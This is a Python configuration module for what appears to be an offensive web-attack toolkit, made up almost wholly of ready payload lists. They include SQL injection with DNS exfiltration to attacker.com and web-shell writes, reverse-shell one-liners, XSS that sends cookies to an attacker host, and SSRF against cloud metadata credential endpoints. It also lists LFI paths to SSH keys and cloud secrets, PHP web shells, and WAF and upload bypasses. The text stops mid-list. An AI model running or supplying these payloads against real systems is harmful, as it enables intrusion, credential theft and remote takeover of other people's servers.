#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v10.0 - ULTIMATE EDITION
Configuration Module - Termux Optimized
"""

import os
import random


class Config:
    """Main Configuration"""

    # Version Info
    VERSION = "10.0-ULTIMATE"
    CODENAME = "TITAN"
    AUTHOR = "Atomic Security"

    # Paths
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    REPORTS_DIR = os.path.join(BASE_DIR, "reports")
    SHELLS_DIR = os.path.join(BASE_DIR, "shells")
    WORDLISTS_DIR = os.path.join(BASE_DIR, "wordlists")

    # Database
    DB_URL = os.environ.get("ATOMIC_DB_URL", f"sqlite:///{BASE_DIR}/atomic_framework.db")

    # GitHub API — optional token for higher rate limits (60 → 5000 req/hr)
    GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")

    # Threading
    MAX_THREADS = min(100, (os.cpu_count() or 4) * 10)
    TIMEOUT = 15
    REQUEST_DELAY = 0.1
    MAX_DEPTH = 5

    # Evasion
    EVASION_LEVELS = ["none", "low", "medium", "high", "insane", "stealth"]

    # User Agents
    USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.0.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ]

    # Proxies rotation
    PROXIES = []

    # Headers rotation
    HEADERS_ROTATION = [
        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
        {"Accept": "application/json, text/javascript, */*; q=0.01"},
        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
        {"Accept": "*/*"},
    ]

    @classmethod
    def get_random_ua(cls):
        return random.choice(cls.USER_AGENTS)

    @classmethod
    def get_random_headers(cls):
        headers = {
            "User-Agent": cls.get_random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0",
        }
        headers.update(random.choice(cls.HEADERS_ROTATION))
        return headers


class Payloads:
    """Advanced Payloads Database"""

    # SQL Injection - Advanced
    SQLI_ERROR_BASED = [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1/*",
        "') OR '1'='1 --",
        "') OR ('1'='1 --",
        "' OR '1'='1' AND 1=1 --",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "1 OR 1=1",
        "1' OR '1'='1",
        "1' AND '1'='1'",
        "1' AND '1'='2'",
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL,NULL --",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' OR 1=1 LIMIT 1 --",
        "' OR '1'='1' LIMIT 1 --",
        "1 AND 1=1",
        "1 AND 1=2",
        "' UNION SELECT @@version --",
        "' UNION SELECT user() --",
        "' UNION SELECT database() --",
        "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
        "'; DROP TABLE users; --",
        "'; DELETE FROM users; --",
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "' AND 1=CONVERT(int, (SELECT DB_NAME())) --",
    ]

    SQLI_TIME_BASED = [
        "' OR SLEEP(5) --",
        "' OR SLEEP(5)#",
        "' OR pg_sleep(5) --",
        "' OR WAITFOR DELAY '0:0:5' --",
        "' OR benchmark(5000000,MD5(1)) --",
        "'; SELECT SLEEP(5) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' OR IF(1=1, SLEEP(5), 0) --",
        "' OR (SELECT COUNT(*) FROM information_schema.tables SLEEP(5)) --",
    ]

    SQLI_UNION_BASED = [
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT null,null,null --",
        "' UNION SELECT @@version,user(),database() --",
        "' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns --",
        "' UNION SELECT username,password,email FROM users --",
        "' UNION SELECT load_file('/etc/passwd'),2,3 --",
        "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
    ]

    # H1: SQLi DNS Exfiltration (MySQL, MSSQL, Oracle, PostgreSQL)
    SQLI_DNS_EXFIL = [
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a')) --",
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.attacker.com\\\\a')) --",
        "'; EXEC master..xp_dirtree '\\\\attacker.com\\a' --",
        "'; EXEC master..xp_subdirs '\\\\attacker.com\\a' --",
        "' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) IS NOT NULL --",
        "' AND DBMS_LDAP.INIT(((SELECT user FROM dual)||'.attacker.com'),80) IS NOT NULL --",
        '\' UNION SELECT EXTRACTVALUE(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/">%remote;]>\'),\'/l\') FROM dual --',
        "COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'",
    ]

    # H1: SQLi Header/Cookie Injection payloads
    SQLI_HEADER_PAYLOADS = [
        "' OR '1'='1' --",
        "' UNION SELECT @@version --",
        "' AND SLEEP(5) --",
        "' OR SLEEP(5)#",
        "1' AND 1=CONVERT(int,@@version) --",
        "1; WAITFOR DELAY '0:0:5' --",
    ]

    # H1: SQLi Charset Bypass (GBK multi-byte, UTF-7)
    SQLI_CHARSET_BYPASS = [
        "%bf%27 OR 1=1 --",  # GBK multi-byte eats backslash
        "%bf%5c' OR 1=1 --",  # SHIFT-JIS bypass
        "%a1%27 OR 1=1 --",  # Big5 bypass
        "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",  # UTF-7
        "' OR 1=1 --".encode().hex(),  # Hex-encoded
    ]

    # H1: SQLi Stored Procedure / File Ops
    SQLI_STORED_PROC = [
        "'; EXEC xp_cmdshell('whoami') --",
        "'; EXEC xp_cmdshell('dir') --",
        "'; EXEC sp_makewebtask '/var/www/html/out.html','SELECT * FROM users' --",
        "' UNION SELECT pg_read_file('/etc/passwd',0,1000) --",
        "' UNION SELECT pg_ls_dir('/etc') --",
        "' UNION SELECT lo_import('/etc/passwd') --",
        "' UNION SELECT 1,2,'<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --",
        "' UNION SELECT 1,2,3 INTO DUMPFILE '/var/www/html/shell.php' --",
        "' UNION SELECT 1 INTO OUTFILE '/tmp/test.txt' --",
    ]

    # H1: SQLi Boolean-based Blind
    SQLI_BOOLEAN_BLIND = [
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND SUBSTRING(@@version,1,1)='5' --",
        "' AND (SELECT COUNT(*) FROM users)>0 --",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --",
        "' AND (SELECT LENGTH(database()))>0 --",
        "' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 1)='a' --",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND (SELECT 1 FROM dual WHERE 1=1) --",
        "1' AND (SELECT 1 FROM dual WHERE 1=2) --",
    ]

    # H1: SQLi Second-Order / Stacked Queries
    SQLI_ADVANCED = [
        "'; INSERT INTO users(username,password) VALUES('hacker','pass') --",
        "'; UPDATE users SET password='hacked' WHERE username='admin' --",
        "'; CREATE TABLE test(data VARCHAR(100)) --",
        "' OR 1=1; -- ",
        "' OR ''='",
        "'-'",
        "' '",
        "'&'",
        "'^'",
        "'*'",
        "' OR ''-'",
        "' OR '' '",
        "' OR ''^'",
        "' OR ''&'",
        "' OR ''*'",
        "' OR 0=0 --",
        "' OR 0=0 #",
        "' OR 0=0/*",
        "') OR ('x'='x",
        "') OR ('x')=('x",
        "' HAVING 1=1 --",
        "' GROUP BY table_name HAVING 1=1 --",
        "' ORDER BY 1 --",
        "' ORDER BY 2 --",
        "' ORDER BY 3 --",
        "' ORDER BY 100 --",
        "1' ORDER BY 1,2,3 --",
        "1' ORDER BY 1,2,3,4 --",
    ]

    # NoSQL Injection
    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$exists": true}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        "{'$gt': ''}",
        "{'$ne': None}",
        "{'$exists': true}",
        "admin' || '1'=='1",
        "admin' && '1'=='1",
        "'; return true; var dummy='",
        "'; return '1'=='1'; var dummy='",
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$where": "sleep(5000)"}',
        '{"$where": "this.sleep(5000)"}',
    ]

    # Command Injection - Advanced
    CMDI_PAYLOADS = [
        "; ls -la",
        "; cat /etc/passwd",
        "; id",
        "; whoami",
        "; uname -a",
        "| ls -la",
        "| cat /etc/passwd",
        "| id",
        "| whoami",
        "&& ls -la",
        "&& cat /etc/passwd",
        "&& id",
        "|| ls -la",
        "|| cat /etc/passwd",
        "`ls -la`",
        "`id`",
        "`whoami`",
        "$(ls -la)",
        "$(id)",
        "$(whoami)",
        "; ping -c 1 127.0.0.1",
        "| ping -c 1 127.0.0.1",
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "; nc -e /bin/sh 127.0.0.1 4444",
        "| nc -e /bin/sh 127.0.0.1 4444",
        "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        '; python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
        '; php -r \'$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        '; ruby -rsocket -e\'f=TCPSocket.open("127.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        '; perl -e \'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
    ]

    # H3: Command Injection - $IFS Bypass
    CMDI_IFS_BYPASS = [
        "cat$IFS/etc/passwd",
        "cat${IFS}/etc/passwd",
        "cat$IFS$9/etc/passwd",
        "ls$IFS-la",
        "id$IFS",
        "whoami$IFS",
        "{cat,/etc/passwd}",
        "{ls,-la,/}",
        "{/bin/bash,-i}",
        "cat</etc/passwd",
        "cat<>/etc/passwd",
        "X=$'cat\\x20/etc/passwd'&&$X",
    ]

    # H3: Command Injection - Wildcard/Glob Bypass
    CMDI_WILDCARD_BYPASS = [
        "/bin/ca? /etc/pas?wd",
        "/bin/ca* /etc/pas*wd",
        "cat /et?/p?ss??",
        "/???/??t /???/??ss??",
        "/???/b??h",
        "/???/b?n/bas?",
        "cat /etc/passw[a-z]",
        "/b[i]n/c[a]t /e[t]c/p[a]sswd",
    ]

    # H3: Command Injection - Encoding Bypass
    CMDI_ENCODING_BYPASS = [
        "$'\\x63\\x61\\x74' /etc/passwd",  # hex for 'cat'
        "$'\\x69\\x64'",  # hex for 'id'
        "$'\\x77\\x68\\x6f\\x61\\x6d\\x69'",  # hex for 'whoami'
        "$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)",  # base64 for 'cat /etc/passwd'
        "$(echo aWQ=|base64 -d)",  # base64 for 'id'
        "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
        "cat ${HOME}/../../../etc/passwd",
        "${PATH%%:*}/../cat /etc/passwd",
    ]

    # H3: Command Injection - Newline / Separator Bypass
    CMDI_NEWLINE_BYPASS = [
        "%0aid",
        "%0A id",
        "%0a cat /etc/passwd",
        "%0d%0a id",
        "\\nid",
        "\\n cat /etc/passwd",
        "%1aid",
        "%1a cat /etc/passwd",
        ";%00id",
        "|%00id",
    ]

    # XSS - Advanced
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",
        "<svg><animate onbegin=alert('XSS') attributeName=x></svg>",
        "<marquee onstart=alert('XSS')>",
        "<meter onmouseover=alert('XSS')>",
        "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
        "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",
        "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
        "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<form action=javascript:alert(1)><input type=submit>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    ]

    # H2: XSS Framework-Specific Payloads
    XSS_FRAMEWORK_PAYLOADS = [
        # AngularJS
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
        # Vue.js
        "{{_c.constructor('alert(1)')()}}",
        "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
        "{{constructor.constructor('alert(1)')()}}",
        # React dangerouslySetInnerHTML
        '{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}',
        # Mavo
        "[7*7]",
        "[self.alert(1)]",
        "[Math.max(alert(1))]",
    ]

    # H2: XSS DOM Clobbering
    XSS_DOM_CLOBBERING = [
        "<img name=getElementById><img name=getElementById>",
        "<form id=document><img name=cookie>",
        "<a id=defaultAction href=javascript:alert(1)>",
        "<img id=documentLinks>",
        "<form id=location href=javascript:alert(1)>",
        "<input name=action type=submit formaction=javascript:alert(1)>",
    ]

    # H2: XSS Encoding / Bypass
    XSS_ENCODING_BYPASS = [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<ScRiPt>alert(1)</sCrIpT>",
        "<script>alert`1`</script>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert&lpar;1&rpar;>",
        '<img src=x onerror="&#x61;lert(1)">',
        '<img src=x onerror="al\\u0065rt(1)">',
        "<img src=x onerror=\\u0061lert(1)>",
        "javas\tcript:alert(1)",
        "java%0ascript:alert(1)",
        "java%0dscript:alert(1)",
        "java%09script:alert(1)",
        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
        "<svg><script>alert&#40;1&#41;</script></svg>",
    ]

    # H2: XSS Markdown / CSS / JSON Hijacking
    XSS_MARKDOWN_CSS = [
        "[click](javascript:alert(1))",
        '![img](x" onerror="alert(1))',
        "[a](<javascript:alert(1)>)",
        "![a]('onerror='alert(1))",
        '<style>@import url("http://attacker.com/?exfil")</style>',
        '<div style="background:url(javascript:alert(1))">',
        "<link rel=stylesheet href=http://attacker.com/evil.css>",
        '<script src="http://attacker.com/data.json">',
    ]

    # H2: XSS Event Handlers (comprehensive)
    XSS_EVENT_HANDLERS = [
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<body onfocus=alert(1)>",
        "<body onhashchange=alert(1)>",
        "<body onresize=alert(1)>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video/poster/onerror=alert(1)>",
        "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a>",
        "<button popovertarget=x>Click</button><div popover id=x onbeforetoggle=alert(1)>1</div>",
    ]

    # LFI/RFI - Advanced
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        r"..\..\..\windows\win.ini",
        r"....\\....\\....\\windows\\win.ini",
        "/etc/passwd%00",
        "../../../etc/passwd%00",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "php://expect://ls",
        "file:///etc/passwd",
        "file:///C:/windows/win.ini",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "expect://ls",
        "input://",
        "data://text/plain,<?php phpinfo(); ?>",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "zip:///var/www/html/upload.zip%23shell.php",
        "phar:///var/www/html/upload.phar/shell.txt",
        "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/access.log",
        "../../../proc/self/environ",
        "../../../proc/self/cmdline",
    ]

    # H4: LFI Advanced Wrappers
    LFI_ADVANCED_WRAPPERS = [
        "zip:///tmp/uploaded.zip%23shell.php",
        "phar:///tmp/test.phar/test.php",
        "glob:///etc/*",
        "glob:///var/www/*",
        "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
        "php://filter/convert.base64-decode/resource=data://plain/base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
    ]

    # H4: LFI Session/Log Poisoning Targets
    LFI_POISONING_TARGETS = [
        "/tmp/sess_SESSIONID",
        "/var/lib/php/sessions/sess_SESSIONID",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/syslog",
        "/var/log/auth.log",
        "/var/log/mail.log",
        "/var/log/httpd/access_log",
        # Rotated logs
        "/var/log/apache2/access.log.1",
        "/var/log/apache2/access.log.2",
        "/var/log/nginx/access.log.1",
        "/var/log/syslog.1",
    ]

    # H4: LFI Docker/K8s Secret Enumeration
    LFI_CLOUD_SECRETS = [
        "/run/secrets/",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "/proc/self/environ",
        "/proc/self/cgroup",
        "/proc/1/environ",
        "/.dockerenv",
        "/etc/kubernetes/admin.conf",
        "/etc/kubernetes/kubelet.conf",
        "/root/.kube/config",
        "/home/user/.aws/credentials",
        "/home/user/.ssh/id_rsa",
        "/proc/self/mountinfo",
    ]

    # H4: LFI pearcmd.php exploitation
    LFI_PEARCMD = [
        "?+config-create+/&file=/usr/local/lib/php/pearcmd.php",
        "?+-c+/tmp/shell.php+-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&file=/usr/local/lib/php/pearcmd.php",
    ]

    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "http://evil.com/shell.php",
        "https://evil.com/shell.txt",
        "ftp://evil.com/shell.php",
        "//evil.com/shell.php",
    ]

    # SSRF - Advanced
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://0177.0.0.1",
        "http://2130706433",
        "http://017700000001",
        "http://0x7f.0.0.1",
        "http://0x7f000001",
        "file:///etc/passwd",
        "dict://localhost:11211/",
        "gopher://localhost:9000/_",
        "ftp://anonymous@localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://instance-data/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/",
    ]

    # H5: SSRF Redirect Chain
    SSRF_REDIRECT_CHAIN = [
        "http://attacker.com/redirect?to=http://169.254.169.254/latest/meta-data/",
        "http://attacker.com/redirect?to=http://127.0.0.1/admin",
        "http://attacker.com/redirect?to=http://localhost:8080/",
    ]

    # H5: SSRF Protocol Smuggling (gopher/dict)
    SSRF_PROTOCOL_SMUGGLING = [
        "gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A",
        "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20payload%20%22%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%0D%0ASAVE%0D%0A",
        "gopher://127.0.0.1:11211/_stats%0D%0A",
        "gopher://127.0.0.1:11211/_set%20pwned%200%2060%204%0D%0Atest%0D%0A",
        "gopher://127.0.0.1:9000/_FCGI",
        "dict://127.0.0.1:6379/INFO",
        "dict://127.0.0.1:11211/stats",
    ]

    # H5: SSRF Cloud Metadata Endpoints
    SSRF_CLOUD_METADATA = [
        # AWS
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://169.254.170.2/v2/credentials",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        # DigitalOcean
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/id",
        # Oracle Cloud
        "http://169.254.169.254/opc/v2/instance/",
        # Alibaba
        "http://100.100.100.200/latest/meta-data/",
    ]

    # H5: SSRF IP Obfuscation Variants
    SSRF_IP_BYPASS = [
        "http://0x7f000001",
        "http://0177.0.0.1",
        "http://2130706433",
        "http://127.1",
        "http://127.0.1",
        "http://0:80",
        "http://[::ffff:127.0.0.1]",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
        "http://127.0.0.1.nip.io",
        "http://localtest.me",
        "http://spoofed.burpcollaborator.net",
        "http://customer1.app/login#@evil.com/",
        "http://evil.com@127.0.0.1/",
        "http://127.0.0.1%2523@evil.com/",
    ]

    # SSTI - Advanced
    SSTI_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "{{config}}",
        "{{self}}",
        "{{request}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]}}",
        "{% raw %}{{7*7}}{% endraw %}",
        "#{7*7}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]

    # XXE - Advanced
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;]><data>&exfil;</data>',
    ]

    # Open Redirect
    OPEN_REDIRECT_PAYLOADS = [
        "http://evil.com",
        "//evil.com",
        "https://evil.com",
        "/\\evil.com",
        "http:evil.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "//attacker.com/%2f..",
        r"/\/attacker.com",
        "https://attacker.com",
        "//attacker.com",
        "/%09/evil.com",
        "/%5cevil.com",
        "///evil.com",
        "////evil.com",
    ]

    # IDOR
    IDOR_SEQUENCES = list(range(1, 100))

    # Path Traversal
    PATH_TRAVERSAL = [
        "../",
        "..%2f",
        "%2e%2e%2f",
        "%252e%252e%252f",
        "..%00/",
        "..%0d/",
        "..%5c",
        "%2e%2e%5c",
        "..\\",
        "....//",
        "....\\",
        ".../",
        "..%c0%af",
        "..%ef%bc%8f",
        "%c0%ae%c0%ae/",
    ]

    # File Upload Bypass
    UPLOAD_BYPASS = [
        ".php",
        ".php3",
        ".php4",
        ".php5",
        ".phtml",
        ".phar",
        ".phps",
        ".pht",
        ".phpt",
        ".Php",
        ".pHp",
        ".PHP",
        ".php.",
        ".php%00.jpg",
        ".php%00.png",
        ".php%00.gif",
        ".php.jpg",
        ".php.png",
        ".php;.jpg",
        ".php%20",
        ".php%0d%0a.jpg",
        ".php%00",
        ".php\x00.jpg",
        ".php%0a",
        ".php5.jpg",
        ".phtml.jpg",
        ".phar.jpg",
    ]

    # Web Shells
    PHP_SHELLS = [
        "<?php system($_GET['cmd']); ?>",
        "<?php echo shell_exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php exec($_GET['cmd'], $out); print_r($out); ?>",
        "<?php eval($_REQUEST['cmd']); ?>",
        "<?php @eval($_POST['cmd']); ?>",
        "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>",
        "<?php $sock=fsockopen('127.0.0.1',4444);exec('/bin/sh -i <&3 >&3 2>&3');?>",
        "GIF89a<?php system($_GET['cmd']); ?>",
        "<?php $c=$_GET['c'];system($c);?>",
    ]

    # WAF Bypass Encodings
    ENCODINGS = {
        "url_single": lambda x: "".join(f"%{ord(c):02x}" for c in x),
        "url_double": lambda x: "".join(f"%25{ord(c):02x}" for c in x),
        "unicode": lambda x: "".join(f"%u{ord(c):04x}" for c in x),
        "html_entities": lambda x: "".join(f"&#{ord(c)};" for c in x),
        "hex": lambda x: "".join(f"\\x{ord(c):02x}" for c in x),
        "octal": lambda x: "".join(f"\\{ord(c):03o}" for c in x),
        "base64": lambda x: __import__("base64").b64encode(x.encode()).decode(),
    }

    # Advanced SQLi - Boolean-based blind
    SQLI_BOOLEAN_BLIND = [
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
        "' AND SUBSTRING(version(),1,1)='5' --",
        "' AND (SELECT LENGTH(database()))>0 --",
        "' AND ORD(MID((SELECT IFNULL(CAST(schema_name AS NCHAR),0x20) FROM information_schema.schemata LIMIT 0,1),1,1))>64 --",
    ]

    # Advanced SQLi - Stacked queries
    SQLI_STACKED = [
        "'; SELECT 1; --",
        "'; SELECT pg_sleep(5); --",
        "'; EXEC xp_cmdshell('whoami'); --",
        "'; DECLARE @q VARCHAR(200)=0x77686f616d69; EXEC(@q); --",
        "'; INSERT INTO users(username,password) VALUES('hacked','hacked'); --",
    ]

    # Advanced SQLi - WAF Bypass techniques
    SQLI_WAF_BYPASS = [
        # MySQL versioned comments
        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --",
        "' /*!50000UNION*/ ALL /*!50000SELECT*/ NULL,NULL,NULL --",
        # Inline comment splitting
        "' UN/**/ION SEL/**/ECT 1,2,3 --",
        "' UNI%0bON SEL%0bECT 1,2,3 --",
        # Case randomization
        "' uNiOn SeLeCt 1,2,3 --",
        "' UnIoN sElEcT NULL,NULL,NULL --",
        # Whitespace alternatives
        "' UNION%09SELECT%091,2,3 --",
        "' UNION%0aSELECT%0a1,2,3 --",
        "' UNION%0dSELECT%0d1,2,3 --",
        "' UNION%0bSELECT%0b1,2,3 --",
        # Scientific notation
        "' OR 1e0=1e0 --",
        "' AND 1e0=1e0 --",
        # LIKE/REGEXP alternatives
